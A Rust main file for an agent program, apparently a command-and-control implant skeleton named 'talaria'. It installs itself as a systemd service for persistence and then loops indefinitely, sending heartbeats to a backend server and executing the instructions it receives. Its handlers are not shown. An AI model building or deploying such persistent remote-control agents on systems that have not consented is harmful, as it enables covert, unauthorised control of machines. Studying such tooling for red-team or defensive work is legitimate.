mod agent;
mod network;

use agent::AgentContext;
use std::time::Duration;
use tokio::time::sleep;

#[tokio::main]
async fn main() {
    // Define the backend server address
    let backend_server_addr = "http://127.0.0.1:8000";

    // Create the agent context
    let mut agent = AgentContext::new(backend_server_addr.to_string());

    // Attempt to set up the agent as a systemd service
    if let Err(err) = network::setup_systemd_service().await {
        eprintln!("Failed to set up systemd service: {}", err);
    } else {
        println!("Systemd service successfully created and started.");
    }

    // Main agent loop
    loop {
        match network::send_heartbeat(&mut agent).await {
            Some(instruction) => network::handle_response(&mut agent, instruction).await,
            None => println!("Failed to communicate with server."),
        }

        sleep(Duration::from_millis(agent.polling_interval_millis)).await;
    }
}


    // let system_info = talaria::SystemInfo {
    //     id: "Agent-1234".to_string(),
    //     os: "Linux".to_string(),
    //     ip: "dynamic-ip-address".to_string(),
    // };
    //
    // let request = Request {
    //     agent_id: system_info.id,
    //     action: "heartbeat".to_string(),
    //     payload: None,
    // };

    // match send_request(&backend_server_addr, request).await {
    //     Ok(response) => println!("Response: {}", response.status),
    //     Err(e) => eprintln!("Error: {}", e),
    // }
